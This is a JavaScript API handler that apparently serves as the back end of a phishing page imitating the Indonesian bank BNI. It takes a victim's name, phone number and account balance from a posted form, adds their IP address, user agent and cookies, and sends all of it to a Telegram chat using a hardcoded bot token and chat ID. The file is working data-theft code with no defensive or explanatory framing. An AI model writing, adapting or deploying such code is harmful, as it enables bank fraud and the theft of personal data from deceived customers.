export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { a, b, c } = req.body;

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.socket?.remoteAddress ||
    'Unknown IP';

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const cookies = req.headers.cookie || 'No cookies sent';

  const message = `
📥 *RES BNI NEW*
────────────────────
👤 *Nama:* ${a}
📱 *Nomor:* ${b}
💰 *Saldo:* ${c}
────────────────────
🌐 *IP:* ${ip}
🧠 *User-Agent:* ${userAgent}
🍪 *Cookies:* ${cookies}
────────────────────`;

  const telegramId = '7869205757';
  const botToken = '7785695206:AAHDvRmyKRqcwx-3hfhBMjvnxqa47vl1rdg';

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram Error:', error);
    res.status(500).json({ success: false });
  }
}
